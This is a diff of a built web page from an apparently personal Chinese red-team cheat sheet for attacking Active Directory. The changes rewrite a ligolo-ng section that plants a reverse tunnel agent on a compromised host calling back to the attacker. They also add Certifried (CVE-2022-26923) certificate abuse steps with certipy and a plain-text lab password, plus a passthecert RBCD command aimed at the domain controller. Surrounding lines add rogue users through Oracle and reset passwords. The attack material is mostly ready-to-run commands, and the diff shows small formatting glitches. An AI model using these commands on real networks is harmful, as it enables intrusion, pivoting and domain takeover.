@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="信息收集-枚举\r前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rntp方式\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 手动方式\r或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; smb方式（隧道环境尤为好用）\r密码\nnet time -S $ip -U &#34;$domain/$user%$pass&#34; # 代理 sudo proxychains4 net time set -S $ip -U &#34;$domain/$user%$pass&#34; hash\nnet time -S $ip -U &#34;$domain/$user&#34; -N --pw-nt-hash $hash # 代理 sudo proxychains4 net time -S $ip -U &#34;$domain/$user&#34; -N --pw-nt-hash $hash tgt\n">
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="ntp方式# 信息收集-枚举\n前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rntp方式\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 手动方式\r或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; smb方式（隧道环境尤为好用）\r密码\nnet time -S $ip -U &#34;$domain/$user%$pass&#34; # 代理 sudo proxychains4 net time set -S $ip -U &#34;$domain/$user%$pass&#34; hash\nnet time -S $ip -U &#34;$domain/$user&#34; -N --pw-nt-hash $hash # 代理 sudo proxychains4 net time -S $ip -U &#34;$domain/$user&#34; -N --pw-nt-hash $hash tgt\n">
 <title>血缇之书</title>
 
 <link rel='canonical' href='https://wackymaker.github.io/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/'>
 
 <link rel="stylesheet" href="/scss/style.min.cfa5b1b0e78d61c00a14173992a1f3fa3b5c1b9fa34d023de959af564e7b19dd.css"><meta property='og:title' content="血缇之书">
-<meta property='og:description' content="信息收集-枚举\r前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rntp方式\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 手动方式\r或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; smb方式（隧道环境尤为好用）\r密码\nnet time -S $ip -U &#34;$domain/$user%$pass&#34; # 代理 sudo proxychains4 net time set -S $ip -U &#34;$domain/$user%$pass&#34; hash\nnet time -S $ip -U &#34;$domain/$user&#34; -N --pw-nt-hash $hash # 代理 sudo proxychains4 net time -S $ip -U &#34;$domain/$user&#34; -N --pw-nt-hash $hash tgt\n">
+<meta property='og:description' content="ntp方式# 信息收集-枚举\n前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rntp方式\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 手动方式\r或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; smb方式（隧道环境尤为好用）\r密码\nnet time -S $ip -U &#34;$domain/$user%$pass&#34; # 代理 sudo proxychains4 net time set -S $ip -U &#34;$domain/$user%$pass&#34; hash\nnet time -S $ip -U &#34;$domain/$user&#34; -N --pw-nt-hash $hash # 代理 sudo proxychains4 net time -S $ip -U &#34;$domain/$user&#34; -N --pw-nt-hash $hash tgt\n">
 <meta property='og:url' content='https://wackymaker.github.io/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/'>
 <meta property='og:site_name' content='wackymaker'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='域之魔法' /><meta property='article:published_time' content='2025-10-31T19:40:56&#43;08:00'/><meta property='article:modified_time' content='2025-10-31T19:40:56&#43;08:00'/>
 <meta name="twitter:title" content="血缇之书">
-<meta name="twitter:description" content="信息收集-枚举\r前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rntp方式\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 手动方式\r或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; smb方式（隧道环境尤为好用）\r密码\nnet time -S $ip -U &#34;$domain/$user%$pass&#34; # 代理 sudo proxychains4 net time set -S $ip -U &#34;$domain/$user%$pass&#34; hash\nnet time -S $ip -U &#34;$domain/$user&#34; -N --pw-nt-hash $hash # 代理 sudo proxychains4 net time -S $ip -U &#34;$domain/$user&#34; -N --pw-nt-hash $hash tgt\n">
+<meta name="twitter:description" content="ntp方式# 信息收集-枚举\n前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rntp方式\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 手动方式\r或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; smb方式（隧道环境尤为好用）\r密码\nnet time -S $ip -U &#34;$domain/$user%$pass&#34; # 代理 sudo proxychains4 net time set -S $ip -U &#34;$domain/$user%$pass&#34; hash\nnet time -S $ip -U &#34;$domain/$user&#34; -N --pw-nt-hash $hash # 代理 sudo proxychains4 net time -S $ip -U &#34;$domain/$user&#34; -N --pw-nt-hash $hash tgt\n">
     </head>
     <body class="
     article-page
@@ -341,12 +341,6 @@
         <li><a href="#regeorg">reGeorg</a></li>
         <li><a href="#带内sliver-sock5">带内sliver-sock5</a></li>
         <li><a href="#wireguard-sliver-socks5">WireGuard-sliver-socks5</a></li>
-      </ul>
-    </li>
-    <li><a href="#tun流量虚拟网卡适合一级内网">tun流量虚拟网卡（适合一级内网）</a>
-      <ul>
-        <li><a href="#ligolo-ng虚拟网卡反向">ligolo-ng虚拟网卡(反向)</a></li>
-        <li><a href="#ligolo-ng虚拟网卡正向">ligolo-ng虚拟网卡(正向)</a></li>
         <li><a href="#msf动态路由">msf动态路由</a></li>
       </ul>
     </li>
@@ -359,6 +353,7 @@
     <li><a href="#其他">其他</a>
       <ul>
         <li><a href="#msf走外部代理">msf走外部代理</a></li>
+        <li><a href="#tun流量虚拟网卡">tun流量虚拟网卡</a></li>
       </ul>
     </li>
   </ul>
@@ -394,6 +389,7 @@
     </li>
     <li><a href="#域历史漏洞或者中继cve">域历史漏洞或者中继（cve）</a>
       <ul>
+        <li><a href="#certifriedcve-2022-26923证书漏洞">Certifried(CVE-2022-26923)证书漏洞</a></li>
         <li><a href="#nopac漏洞">nopac漏洞</a></li>
         <li><a href="#cross-session-relay-跨会话中继">Cross Session Relay 跨会话中继</a></li>
         <li><a href="#krbrelay域用户提升域管理">krbRelay(域用户提升域管理)</a></li>
@@ -698,7 +694,7 @@
 
 
                 <time class="article-time--reading">
-                    52 minute read
+                    53 minute read
                 </time>
             </div>
         
@@ -713,8 +709,8 @@
     <section class="article-content">
     
     
-    <h1 id="信息收集-枚举">信息收集-枚举
-</h1><h2 id="前枚举">前枚举
+    <p>ntp方式# 信息收集-枚举</p>
+<h2 id="前枚举">前枚举
 </h2><h3 id="域名解析">域名解析
 </h3><p>nxc</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc smb ip --generate-hosts-file hostname
@@ -1724,36 +1720,7 @@ nxc</p>
 <p>取消代理</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>wg-socks <span style="color:#75715e"># 查看存活代理id</span>
 </span></span><span style="display:flex;"><span>wg-socks stop <span style="color:#f92672">[</span>id<span style="color:#f92672">]</span>
-</span></span></code></pre></div><h2 id="tun流量虚拟网卡适合一级内网">tun流量虚拟网卡（适合一级内网）
-</h2><h3 id="ligolo-ng虚拟网卡反向">ligolo-ng虚拟网卡(反向)
-</h3><p>如果只是想通过边界入侵一层内网，ligolo是最好的选择，我们可以抛弃繁杂的proxychains</p>
-<p>ligolo的原理是搭建一条tun隧道，也就是建立一条虚拟网卡并指向指定路由，这种原理导致其十分稳定且好用，并且其只需要一个服务端就可以做到多个客户端连接并且切换使用路由的操作</p>
-<p>前置操作-攻击机(kali)执行-创建虚拟网卡</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>sudo ip link del ligolo 2&gt;/dev/null  <span style="color:#75715e"># 清理旧接口（可选）</span>
-</span></span><span style="display:flex;"><span>sudo ip tuntap add user <span style="color:#66d9ef">$(</span>whoami<span style="color:#66d9ef">)</span> mode tun ligolo  <span style="color:#75715e"># 创建 TUN 设备</span>
-</span></span><span style="display:flex;"><span>sudo ip link set ligolo up             <span style="color:#75715e"># 启用接口</span>
-</span></span><span style="display:flex;"><span>sudo ip route add 10.0.52.0/24 dev ligolo  <span style="color:#75715e"># 添加路由规则.这里举例内网为10.0.52.0网段</span>
-</span></span></code></pre></div><p>启动代理服务端-攻击端kali执行</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>./proxy -laddr 0.0.0.0:9001 -selfcert  <span style="color:#75715e"># 监听 9001 端口</span>
-</span></span></code></pre></div><p>对目标上传客户端并且连接客户端</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>./agent -connect 攻击机_IP:9001 -ignore-cert  <span style="color:#75715e"># 连接代理</span>
-</span></span></code></pre></div><p>当连接成功后，我们能通过在服务端输入命令切换或者启动路由</p>
-<p>启动路由</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>ligolo-ng » session
-</span></span><span style="display:flex;"><span>ligolo-ng » <span style="color:#ae81ff">1</span> <span style="color:#75715e"># 输入对应的数字</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Agent : test@test<span style="color:#f92672">]</span> » start
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 成功后会显示：INFO[xxxx] Starting tunnel to test@test</span>
-</span></span></code></pre></div><p>如果接入新的客户端需要连接新的网段</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>先链接新的客户端，或者当前客户端，之后直接添加新路由即可
-</span></span><span style="display:flex;"><span>sudo ip route add 10.0.56.0/24 dev ligolo 
-</span></span><span style="display:flex;"><span>不要删除原有的10.0.52.0路由，两者共存才能同时访问两个网段
-</span></span></code></pre></div><h3 id="ligolo-ng虚拟网卡正向">ligolo-ng虚拟网卡(正向)
-</h3><p>其余设置与反向一致，只是连接以agent充当服务器</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>./agent -bind 0.0.0.0:9001
-</span></span></code></pre></div><p>先进入ligolo，之后本地主动连接</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>ligolo-ng » connect_agent --ip $入口机:9001
-</span></span></code></pre></div><p>之后start即可</p>
-<h3 id="msf动态路由">msf动态路由
+</span></span></code></pre></div><h3 id="msf动态路由">msf动态路由
 </h3><p>msf的动态路由相当于一个专属于它自己的代理，当我们获取一个目标的msf载荷之后，可以直接配置动态路由来进行msf方便的内网入侵</p>
 <p>这里我模拟我们搞到了一台内网session 1,其内网网段模拟为169.254.12.1,执行以下命令</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>use post/multi/manage/autoroute
@@ -1821,7 +1788,63 @@ nxc</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>setg proxies socks5:127.0.0.1:6000
 </span></span></code></pre></div><p>并且如果这个时候我们需要反弹shell，msf会默认目标处于内网无法回弹，但是如果我们知道目标能访问到我们，我们可以直接使用下面的参数规避报错</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>set ReverseAllowProxy true
-</span></span></code></pre></div><h1 id="提权or横向">提权or横向
+</span></span></code></pre></div><h3 id="tun流量虚拟网卡">tun流量虚拟网卡
+</h3><p>如果只是想通过边界入侵内网，ligolo是最好的选择，我们可以抛弃繁杂的proxychains，并且ligolo的tun流量会将隧道实现最稳定的模式，远超socks流量</p>
+<p>但经过测试，windows端的ligolo——proxy使用有很大问题，在配置winunl的情况下依旧无法连接流量，所以主控以linux为主</p>
+<p>ligoli上线分为四步 1-上线，2-创建本地网卡，3-将tun流量绑定至网卡，4-清除网卡</p>
+<h4 id="1-上线">1-上线
+</h4><h5 id="ligolo-ng虚拟网卡反向连接">ligolo-ng虚拟网卡(反向连接)
+</h5><p>启动代理服务端-攻击端kali执行</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>./proxy -laddr 0.0.0.0:9001 -selfcert  <span style="color:#75715e"># 监听 9001 端口</span>
+</span></span></code></pre></div><p>对目标上传客户端并且连接客户端</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>./agent -connect 攻击机_IP:9001 -ignore-cert  <span style="color:#75715e"># 连接代理</span>
+</span></span></code></pre></div><p>当连接成功后，我们能通过在服务端输入命令切换或者启动路由</p>
+<h5 id="ligolo-ng虚拟网卡正向">ligolo-ng虚拟网卡(正向)
+</h5><p>其余设置与反向一致，只是连接以agent充当服务器，这里以被攻击机本地的9001监听</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>./agent -bind 0.0.0.0:9001
+</span></span></code></pre></div><p>启动代理服务端-攻击端kali执行</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>./proxy -laddr 0.0.0.0:9001 -selfcert  <span style="color:#75715e"># 监听 9001 端口</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">```</span>之后本地主动连接
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">```</span>zsh
+</span></span><span style="display:flex;"><span>ligolo-ng » connect_agent --ip $入口机:9001
+</span></span></code></pre></div><h4 id="2-创建网卡">2-创建网卡
+</h4><p>创建网卡</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>ifcreate --name $网卡名
+</span></span></code></pre></div><p>删除网卡</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>ifdel --name $网卡名
+</span></span></code></pre></div><h4 id="3-绑定流量">3-绑定流量
+</h4><p>首先session选择目标agent，之后使用如下命令绑定网卡</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>tunnel_start --tun $网卡名
+</span></span></code></pre></div><p>随后使用ifconfig查看当前agent网段，例如</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#f92672">[</span>Agent : root@webserver.aoseluauto.com<span style="color:#f92672">]</span> » ifconfig
+</span></span><span style="display:flex;"><span>┌────────────────────────────────────┐
+</span></span><span style="display:flex;"><span>│ Interface <span style="color:#ae81ff">0</span>                        │
+</span></span><span style="display:flex;"><span>├──────────────┬─────────────────────┤
+</span></span><span style="display:flex;"><span>│ Name         │ lo                  │
+</span></span><span style="display:flex;"><span>│ Hardware MAC │                     │
+</span></span><span style="display:flex;"><span>│ MTU          │ <span style="color:#ae81ff">65536</span>               │
+</span></span><span style="display:flex;"><span>│ Flags        │ up|loopback|running │
+</span></span><span style="display:flex;"><span>│ IPv4 Address │ 127.0.0.1/8         │
+</span></span><span style="display:flex;"><span>│ IPv6 Address │ ::1/128             │
+</span></span><span style="display:flex;"><span>└──────────────┴─────────────────────┘
+</span></span><span style="display:flex;"><span>┌───────────────────────────────────────────────┐
+</span></span><span style="display:flex;"><span>│ Interface <span style="color:#ae81ff">1</span>                                   │
+</span></span><span style="display:flex;"><span>├──────────────┬────────────────────────────────┤
+</span></span><span style="display:flex;"><span>│ Name         │ ens5                           │
+</span></span><span style="display:flex;"><span>│ Hardware MAC │ 00:16:3e:16:7e:47              │
+</span></span><span style="display:flex;"><span>│ MTU          │ <span style="color:#ae81ff">1500</span>                           │
+</span></span><span style="display:flex;"><span>│ Flags        │ up|broadcast|multicast|running │
+</span></span><span style="display:flex;"><span>│ IPv4 Address │ 172.16.53.30/16                │
+</span></span><span style="display:flex;"><span>│ IPv6 Address │ fe80::216:3eff:fe16:7e47/64    │
+</span></span><span style="display:flex;"><span>└──────────────┴────────────────────────────────┘
+</span></span></code></pre></div><p>将网段建立在这个路由上,跟具如上路由，命令如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>route_add --name $网卡名 --route 172.16.53.30/16
+</span></span></code></pre></div><p>可以通过route_list查看路由情况</p>
+<h4 id="注意">注意
+</h4><p>请使用完毕务必删除网卡，否则会导致流量乱流</p>
+<h4 id="ligolo-ng多级网络思路">ligolo-ng多级网络思路
+</h4><p>暂略</p>
+<h1 id="提权or横向">提权or横向
 </h1><h2 id="密码过期用户更改密码">密码过期用户更改密码
 </h2><p>可以直接利用changepass.py更改，他调用的是rpcsmc接口允许跳过认证</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-changepasswd $domain/$user:<span style="color:#e6db74">&#34;&#34;</span>@$ip -newpass wackMaker1!
@@ -2376,8 +2399,26 @@ nxc</p>
 </span></span></code></pre></div><p>如果允许，可以执行命令，建议不要过长</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>odat dbmsscheduler -s $ip  -n $database   -U $user   -P $pass --sysdba --exec <span style="color:#e6db74">&#39;net user wackymaker wack1234! /add&#39;</span>
 </span></span></code></pre></div><h2 id="域历史漏洞或者中继cve">域历史漏洞或者中继（cve）
-</h2><h3 id="nopac漏洞">nopac漏洞
+</h2><h3 id="certifriedcve-2022-26923证书漏洞">Certifried(CVE-2022-26923)证书漏洞
 </h3><h4 id="要求">要求
+</h4><p>需要一个已经掌握的域用户，并且允许创建机器用户</p>
+<p>需要2022年左右的adcs，检测是否存在逻辑如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>certipy req -u <span style="color:#e6db74">&#34;</span>$USER<span style="color:#e6db74">@</span>$DOMAIN<span style="color:#e6db74">&#34;</span> -p <span style="color:#e6db74">&#34;</span>$PASSWORD<span style="color:#e6db74">&#34;</span> -dc-ip <span style="color:#e6db74">&#34;</span>$DC_IP<span style="color:#e6db74">&#34;</span> -target <span style="color:#e6db74">&#34;</span>$ADCS_HOST<span style="color:#e6db74">&#34;</span> -ca <span style="color:#e6db74">&#39;ca_name&#39;</span> -template <span style="color:#e6db74">&#39;User&#39;</span>
+</span></span></code></pre></div><p>如果 Certipy 不打印Certificate object SID is [&hellip;]获得证书后,就可以进行攻击。</p>
+<h4 id="攻击命令">攻击命令
+</h4><p>创建机器用户,certipt会提供创建用户的密码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>certipy account create -u $user -hashes $hash -user <span style="color:#e6db74">&#34;wack&#34;</span> -dc-ip $dc_ip  -dns $dns_fqdn
+</span></span></code></pre></div><p>注册dc机器证书</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>certipy -debug req <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-u <span style="color:#e6db74">&#39;wack$@xiaorang.lab&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-p <span style="color:#e6db74">&#39;IjPxvp5AkgngsiNT&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-ca $ca_fqdn <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-dc-ip $dc_ip <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-template <span style="color:#e6db74">&#39;Machine&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-target $ca_ip
+</span></span></code></pre></div><p>此证书可用于dc机器用户身份认证，后续思路是直接认证dc用户hash或者传递证书进行rbcd</p>
+<h3 id="nopac漏洞">nopac漏洞
+</h3><h4 id="要求-1">要求
 </h4><p>必须同时存在以下两个漏洞：</p>
 <p>CVE‑2021‑42278</p>
 <p>DC 对 不存在的计算机账户名 处理不严</p>
@@ -2385,12 +2426,12 @@ nxc</p>
 <p>TGS 校验 sAMAccountName 与 SID 不一致</p>
 <p>检测命令</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc smb  $ip -u <span style="color:#e6db74">&#34;</span>$user<span style="color:#e6db74">&#34;</span> -p <span style="color:#e6db74">&#34;</span>$pass<span style="color:#e6db74">&#34;</span> -M nopac
-</span></span></code></pre></div><h4 id="攻击命令">攻击命令
+</span></span></code></pre></div><h4 id="攻击命令-1">攻击命令
 </h4><p>使用工具</p>
 <pre tabindex="0"><code>https://github.com/Ridter/noPac
 </code></pre><h3 id="cross-session-relay-跨会话中继">Cross Session Relay 跨会话中继
 </h3><p>当存在其他用户登陆会话后，可以尝试打跨会话中继获得登陆会话的用户hash</p>
-<h4 id="要求-1">要求
+<h4 id="要求-2">要求
 </h4><p>无要求，需要确认存在用户登陆会话，最好还要确定目标防火墙规则</p>
 <h4 id="remotepotato0exe">RemotePotato0.exe
 </h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>https://github.com/antonioCoco/RemotePotato0/releases
@@ -2405,7 +2446,7 @@ nxc</p>
 </span></span><span style="display:flex;"><span>-p 监听端口
 </span></span></code></pre></div><p>如果防火墙不允许，请不要使用9999</p>
 <h3 id="krbrelay域用户提升域管理">krbRelay(域用户提升域管理)
-</h3><h4 id="要求-2">要求
+</h3><h4 id="要求-3">要求
 </h4><p>1，具备域用户
 2，没有 2022 年 10 月的补丁
 3，必须禁用 LDAP 签名（这是 Windows 的默认设置）。
@@ -2734,7 +2775,7 @@ nxc</p>
 </span></span><span style="display:flex;"><span>sc.exe \\$hostname start dns
 </span></span></code></pre></div><p>如果不具备服务重启权限的话，可以利用工具直接重启</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>dnscmd.exe <span style="color:#ae81ff">127.0</span>.0.1 /restart
-</span></span></code></pre></div><h4 id="注意">注意
+</span></span></code></pre></div><h4 id="注意-1">注意
 </h4><p>2021年更新后的ad无法使用，微软对这一功能进行了加固：</p>
 <p>ServerLevelPluginDll 参数已被移到受保护的注册表位置（HKLM\SYSTEM\CurrentControlSet\Services\DNS\InternalParameters）。
 只有完全管理员（如 Domain Admins 或 DNS 服务器本地的 Administrators）才能修改它。</p>
@@ -3086,6 +3127,8 @@ nxc</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>python3 passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain $domain -dc-ip $ip
 </span></span></code></pre></div><p>输入help可以查看可以使用的命令，但是最常用的还是将以捕获用户直接添加入管理员组，我们一般申请的证书就是管理员证书</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>add_user_to_group $user administrators
+</span></span></code></pre></div><p>或者构造对dc的rbcd</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>python3 passthecert.py -action write_rbcd -crt server.crt -key server.key -domain $domain -dc-ip $dc_ip -delegate-to $dc_fqdn -delegate-from <span style="color:#e6db74">&#39;域内掌控机器机器名$&#39;</span>
 </span></span></code></pre></div><h4 id="certipy-ad-1">certipy-ad
 </h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>certipy-ad auth -pfx dc1.pfx -dc-ip $ip -ldap-shell
 </span></span></code></pre></div><p>输入help，与passthecert.py利用一致</p>
